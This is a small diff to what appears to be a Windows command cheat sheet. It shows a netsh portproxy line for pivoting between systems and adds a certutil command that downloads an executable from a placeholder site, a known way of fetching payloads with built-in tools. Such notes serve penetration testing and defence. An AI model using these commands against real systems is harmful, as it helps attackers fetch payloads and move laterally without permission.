@@ -65,3 +65,6 @@ etl2pcapng.exe capture.etl pcap.pcapng
 
 #netsh for pivoting systems
 netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<port> connectaddress=<pivotaddress> connectport=<pivotport> #requires admin
+
+#certutil for downloading files
+certutil.exe -urlcache -split -f http://<filesite>/<filename>.exe <newfile.exe>
